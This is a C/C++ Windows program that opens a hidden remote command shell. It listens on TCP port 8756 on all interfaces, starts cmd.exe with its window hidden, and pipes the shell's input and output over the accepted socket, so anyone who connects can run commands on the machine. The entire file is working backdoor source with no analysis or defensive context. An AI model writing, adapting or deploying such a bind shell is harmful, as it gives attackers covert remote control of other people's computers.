#include <stdio.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib")

#define BUFFER_SIZE 1024
#define MYPORT 8756

typedef struct {
	SOCKET *socket;
	HANDLE pipe;
} ComNode, *pComNode;

DWORD WINAPI ThreadInput(LPVOID lpparm)
{
	ComNode mInputNode = *(pComNode)lpparm;
	char buf[BUFFER_SIZE] = { 0 };
	while (true)
	{
		if (*mInputNode.socket == INVALID_SOCKET)
		{
			return FALSE;
		}

		DWORD dwWrited = 0;
		DWORD ret = recv(*mInputNode.socket, buf, BUFFER_SIZE, 0);
		if (ret > 0 && ret != SOCKET_ERROR)
		{
			WriteFile(mInputNode.pipe, buf, ret, &dwWrited, 0);
			if (!strncmp(buf, "exit\r\n", 6))
			{
				*mInputNode.socket = INVALID_SOCKET;
			}
		}
		else
		{
			closesocket(*mInputNode.socket);
			*mInputNode.socket = INVALID_SOCKET;
			WriteFile(mInputNode.pipe, "exit\r\n", sizeof("exit\r\n"), &dwWrited, NULL);
			return FALSE;
		}
		Sleep(50);
	}
	return TRUE;
}

DWORD WINAPI ThreadOutput(LPVOID lpparm)
{
	ComNode mOutputNode = *(pComNode)lpparm;

	char buf[BUFFER_SIZE * 4] = { 0 };
	DWORD dwTotalRead = 0;
	DWORD dwReaded = 0;
	BOOL bRet = FALSE;
	char *sendBuffer = nullptr;
	while (true)
	{
		if (*mOutputNode.socket == INVALID_SOCKET)
		{
			return FALSE;
		}

		bRet = PeekNamedPipe(mOutputNode.pipe, NULL, 0, NULL, &dwTotalRead, NULL);
		if (bRet && dwTotalRead > 0)
		{
			bRet = ReadFile(mOutputNode.pipe, buf, BUFFER_SIZE * 4, &dwReaded, NULL);
			if (bRet && dwReaded > 0)
			{
				DWORD dwSendSize = 0;
				sendBuffer = buf;
				do
				{
					dwSendSize = send(*mOutputNode.socket, sendBuffer, dwReaded, 0);
					sendBuffer += dwSendSize;
					dwReaded -= dwSendSize;
				} while (dwSendSize > 0);
			}
		}

		Sleep(50);
	}
	return TRUE;
}

BOOL createSocketShell(UINT port)
{
	WSADATA wsaData = { 0 };
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	sockaddr_in server = { 0 };
	SOCKET m_accpetSock = INVALID_SOCKET;
	SOCKET m_listenSock = INVALID_SOCKET;
	m_listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl(INADDR_ANY);
	server.sin_port = htons(port);
	bind(m_listenSock, (sockaddr *)&server, sizeof(server));
	listen(m_listenSock, 1);
	m_accpetSock = accept(m_listenSock, NULL, NULL);

	STARTUPINFOA startupInfo = { 0 };
	PROCESS_INFORMATION processInformation = { 0 };
	startupInfo.cb = sizeof(STARTUPINFO);
	GetStartupInfoA(&startupInfo);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	HANDLE hReadPipe1, hWritePipe1;
	HANDLE hReadPipe2, hWritePipe2;
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
	CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0);
	startupInfo.hStdInput = hReadPipe1;
	startupInfo.hStdOutput = startupInfo.hStdError = hWritePipe2;
	startupInfo.wShowWindow = SW_HIDE;
	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInformation);

	ComNode mInputNode, mOutputNode;
	mInputNode.socket = mOutputNode.socket = &m_accpetSock;
	mInputNode.pipe = hWritePipe1;
	mOutputNode.pipe = hReadPipe2;
	DWORD dwThreadInput = 0;
	DWORD dwThreadOutput = 0;
	HANDLE hThreadInput = CreateThread(NULL, 0, ThreadInput, &mInputNode, 0, &dwThreadInput);
	HANDLE hThreadOutput = CreateThread(NULL, 0, ThreadOutput, &mOutputNode, 0, &dwThreadOutput);


	HANDLE szHandles[] = { hThreadOutput ,hThreadInput };
	WaitForMultipleObjects(2, szHandles, TRUE, INFINITE);

	if (m_listenSock != INVALID_SOCKET)
	{
		closesocket(m_listenSock);
	}

	if (m_accpetSock != INVALID_SOCKET)
	{
		closesocket(m_accpetSock);
	}
	WSACleanup();
	return TRUE;
}

int main(int argc, char* argv[])
{
	createSocketShell(MYPORT);
	return 0;
}